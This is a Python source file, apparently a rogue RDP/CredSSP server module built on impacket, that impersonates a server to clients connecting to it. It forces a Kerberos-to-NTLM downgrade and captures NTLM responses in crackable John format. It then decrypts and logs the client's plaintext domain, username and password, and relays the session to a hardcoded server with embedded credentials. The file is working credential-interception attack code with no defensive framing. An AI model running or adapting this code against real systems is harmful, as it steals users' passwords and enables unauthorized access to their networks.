from TSDecode import *
from NTLMStruct import *
from keyManagement import *
from ClientConnect import *
import socket
import select
import sys
import ssl
import time
import hashlib
import argparse
from OpenSSL import crypto
from struct import pack, unpack
from binascii import unhexlify, hexlify
from impacket.spnego import *
from impacket.examples import logger
from impacket.ntlm import *
from impacket.structure import Structure
from impacket.spnego import GSSAPI, ASN1_SEQUENCE, ASN1_OCTET_STRING, asn1decode, asn1encode
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.nt_errors import ERROR_MESSAGES
from impacket.nt_errors import STATUS_LOGON_FAILURE,                                 STATUS_SUCCESS,                 STATUS_ACCESS_DENIED, STATUS_NOT_SUPPORTED, \
     STATUS_MORE_PROCESSING_REQUIRED

from impacket.smbserver import outputToJohnFormat

#Defines the current SPNEGO step to know which action to perform
currentStep=1

#Create a global NTLMRequest so that we can find the challenge parameters in any SPNEGO Step
NTLMRequest= NTLMType2()
sessionKey = b"\00"
cipher = None
Kerb = False

#Function to refuse Kerberos on SPNEGO
def refuseKerberos(sock,buff,options):
        global NTLMRequest
        global Kerb
        raw_request = "\x30\x26\xa0\x03\x02\x01\x06\xa1\x1f\x30\x1d\x30\x1b\xa0\x19\x04\x17\xa1\x15\x30\x13\xa0\x03\x0a\x01\x03\xa1\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
        my_request = TSRequest()
        my_request.fromString(raw_request)
        sock.send(raw_request)
        buff=sock.recv(4096)
        ts_request = TSRequest()
        ts_request.fromString(buff)
        print "envoi2"
        print ts_request.fields
        NTLMRequest = getNTLMSSPType2(options.serverName, options.domain, options.dnsdomain)
        # Not Working !
        my_request['authInfo'] =  NTLMRequest.getData()
        my_request['Version'] =  1
        #Removing content of NegoData
        my_request['NegoData']=""
        #my_request['NegoDataKerb'] = "i"
        my_request2 = TSRequest()
        my_request2['Version'] = options.CredSSP
        #print ':'.join("{:02x}".format(ord(c)) for c in my_request.getKRBData())
        my_request2['NegoData'] = my_request.getKRBData()
        Kerb = True
        #print "Double Encoding"
        #print ':'.join("{:02x}".format(ord(c)) for c in my_request2.getData())
        sock.send(my_request2.getData())
        #buff = sock.recv(4096)

#We received the SPNEGO request, sending NTLM Type2 (challenge)
def step1(sock,options):
    buff = sock.recv(4096)
    print "Sending NTLM Type2 Challenge"
    global NTLMRequest
    client_request = TSRequest()
    client_request.fromString(buff)
    if client_request['NegoData'][0] != 'N':
        print 'Renegociating to NTLMSSP'
        try:
            refuseKerberos(sock,buff,options)
        except Exception as e: print(e)

    else:
        try:
            NTLMRequest = getNTLMSSPType2(options.serverName, options.domain, options.dnsdomain)
            my_request = TSRequest()
            my_request['NegoData']= NTLMRequest.getData()
            my_request['Version'] = options.CredSSP
            #print ':'.join("{:02x}".format(ord(c)) for c in my_request.getData())
            sock.send(my_request.getData())
        except Exception as e: print(e)


#Client answered the NTLM Challenge, we now should encrypt the pubkey from the server and send the authentication success/failure to the client
def step2(sock,options):
    buff = sock.recv(4096)
    global NTLMRequest
    global sessionKey
    global cipher
    global Kerb
    try:
        print "Receiving NTLM Response"
        #print ':'.join("{:02x}".format(ord(c)) for c in buff)
        clientRequest = TSRequest()
        if Kerb == False:
            clientRequest.fromString(buff)
            authenticateMessage = NTLMAuthChallengeResponse()
            authenticateMessage.fromString(clientRequest['NegoData'])
        else:
            print 'trying to grab ntlmresponse in a krbdowngrade'
            index = buff.find('NTLMSSP')
            NTLMResponse = buff[index:]
            authenticateMessage = NTLMAuthChallengeResponse()
            authenticateMessage.fromString(NTLMResponse)
            print 'finished creating a authmessage'

        ntlm_hash_data = outputToJohnFormat(NTLMRequest['challenge'],authenticateMessage['user_name'],authenticateMessage['domain_name'],authenticateMessage['lanman'],authenticateMessage['ntlm'])
        print ntlm_hash_data['hash_string']
        if options.outfile != None:
            F = open(options.outfile,'a')
            F.write(ntlm_hash_data['hash_string'])
            F.write('\n\r')
            F.close()


        sessionKey = getSessionKey(options.computer,options.domain,options.domainIP, options.hashes, options.serverName, authenticateMessage)

        pubKeyStr = getPubKey()

        if options.CredSSP > 4 and Kerb == False :
         magic = b"CredSSP Server-To-Client Binding Hash\x00"
         h256 = hashlib.sha256()
         h256.update(magic)
         h256.update(clientRequest['clientNonce'])
         h256.update(pubKeyStr)
         cipher = SPNEGOCipher(NTLMRequest['flags'] ,sessionKey)
         signature, cripted_key = cipher.clientEncrypt(clientRequest['pubKeyAuth'][16:])
         signature, cripted_key = cipher.serverEncrypt(h256.digest())
        else:
            cipher = SPNEGOCipher(NTLMRequest['flags'] ,sessionKey)
            signature, plain = cipher.clientEncrypt(clientRequest['pubKeyAuth'][16:])
            pubKeyStr = chr(ord(pubKeyStr[0]) + 1) + pubKeyStr[1:]
            signature, cripted_key = cipher.serverEncrypt(pubKeyStr)

        print "Prooving that we know Session Key"
        answer = TSRequest()
        answer['Version']= options.CredSSP
        answer['pubKeyAuth']= signature.getData() + cripted_key
        sock.send(answer.getData())

    except Exception as e:
        print(e)

def step3(sock,options):
    buff = sock.recv(4096)
    global cipher
    print "Receiving Password"
    clientRequest = TSRequest()
    clientRequest.fromString(buff)
    signature, plain = cipher.clientEncrypt(clientRequest['authInfo'][16:])
    tsc = TSCredentials()
    try :
        tsc.fromString(plain)
        tsp = TSPasswordCreds()
        tsp.fromString(tsc['credentials'])
        Creds = "Credentials are: domain: "+ tsp['domainName'] + " username: " + tsp['userName'] + " password: " + tsp['password']
        print Creds
        if options.outfile != None:
            F = open(options.outfile,'a')
            F.write(Creds)
            F.write('\n\r')
            F.close()

    except Exception as e:
        print e

def step4(sock,options):
    srvsocket = clientConnect("10.63.0.21","yof","Pass1234!","pyfoot.com")
    print "connected to server"
    while True:
        ready=select.select([srvsocket],[],[],1)
        print ready[0]
        if ready[0]:
            sock.send(srvsocket.recv(4096))
        ready=select.select([sock],[],[],1)
        if ready[0]:
            srvsocket.send(sock.recv(4096))

SPNEGOStep = {
        1: step1,
        2: step2,
        3: step3,
        4: step4
        }

def SPNEGOHandler(sock,options):
    try:
        global currentStep
        SPNEGOStep[currentStep](sock,options)
        currentStep = currentStep + 1
        print "next step ",currentStep
    except Exception as e:
        print 'exception raised'
        print e
        currentStep = 1
        raise
